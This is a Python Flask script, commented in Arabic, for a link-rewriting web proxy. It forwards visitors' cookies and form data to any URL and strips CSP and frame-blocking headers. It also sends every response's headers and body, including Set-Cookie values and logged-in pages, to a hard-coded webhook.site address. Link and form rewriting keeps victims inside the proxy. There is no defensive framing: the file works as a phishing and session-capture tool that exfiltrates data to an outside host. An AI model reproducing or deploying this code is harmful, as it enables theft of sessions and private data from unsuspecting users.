import re
import os  # Import os module for handling environment variables
from flask import Flask, request, Response
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://webhook.site/e1f65978-cf22-4db6-a7ad-96297907b8dd"  # استبدل بعنوان الـ webhook الفعلي

@app.route('/proxy', methods=['GET', 'POST'])
def proxy():
    target_url = request.args.get('url')
    if not target_url:
        return "Error: No URL provided!", 400

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Encoding": "identity",  # تعطيل الضغط gzip/deflate
            "Cookie": request.headers.get("Cookie", "")  # تمرير الكوكيز إن وجدت
        }

        # إذا كانت طريقة الطلب هي POST، نرسل البيانات المرفقة أيضًا
        if request.method == 'POST':
            data = request.form  # جلب بيانات النموذج المرسلة
            response = requests.post(target_url, headers=headers, data=data, cookies=request.cookies)
        else:
            response = requests.get(target_url, headers=headers, cookies=request.cookies)

        # إرسال جميع المعلومات إلى الـ webhook
        send_to_webhook(response.headers, response.text)

        # استخراج `https://example.com`
        base_url = "/".join(target_url.split("/")[:3])  

        # تحويل الروابط النسبية إلى مطلقة
        modified_html = re.sub(
            r'(<(link|script|img|a|form)[^>]+(?:href|src|action)=["\'])(/[^"\']+)(["\'])',
            rf'\1{base_url}\3\4', response.text
        )

        # توجيه الروابط لتبقى داخل البروكسي
        modified_html = re.sub(
            r'(<(a|form)[^>]+(?:href|action)=["\'])(https?://[^"\']+)(["\'])',
            rf'\1http://localhost:5000/proxy?url=\3\4', modified_html
        )

        # إزالة `CSP` و `X-Frame-Options`
        excluded_headers = ['content-security-policy', 'x-frame-options', 'access-control-allow-origin', 'transfer-encoding']
        headers = [(name, value) for name, value in response.headers.items() if name.lower() not in excluded_headers]
        headers.append(('Access-Control-Allow-Origin', '*'))

        # إنشاء استجابة جديدة من Flask
        flask_response = Response(modified_html, response.status_code, headers)

        # إعادة إرسال الكوكيز إلى العميل
        for cookie, value in response.cookies.items():
            flask_response.set_cookie(cookie, value)

        return flask_response

    except requests.exceptions.RequestException as e:
        return f"Request error: {e}", 500


def send_to_webhook(headers, body):
    """
    إرسال الرؤوس والجسم إلى الـ webhook
    """
    webhook_payload = {
        "headers": dict(headers),
        "body": body
    }
    
    try:
        requests.post(WEBHOOK_URL, json=webhook_payload)
    except requests.exceptions.RequestException as e:
        print(f"Error sending to webhook: {e}")

# Ensure the app runs on the correct host and port
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Get the dynamic port from environment
    app.run(debug=True, host='0.0.0.0', port=port)
